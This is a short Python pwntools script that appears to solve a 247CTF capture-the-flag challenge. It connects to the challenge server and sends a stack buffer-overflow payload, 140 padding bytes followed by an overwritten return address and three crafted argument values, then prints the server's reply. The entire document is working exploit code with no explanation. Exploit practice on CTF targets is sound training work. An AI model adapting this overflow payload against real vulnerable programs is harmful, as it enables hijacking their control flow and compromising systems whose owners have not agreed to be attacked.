
```python
#!/usr/bin/env python3
from pwn import *
import sys

HOST = 'e9645d1406706937.247ctf.com'
PORT = 50275
try:
    conn = remote(HOST, PORT)
    payload = b'a' * 140 + p32(0x08048576) + b'P'*4 + p32(0x1337) + p32(0x247) + p32(0x12345678)
    conn.sendline(payload)
    response = conn.recvall(timeout=5).decode('latin-1')
    print(response)
    conn.close()
    
except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
```
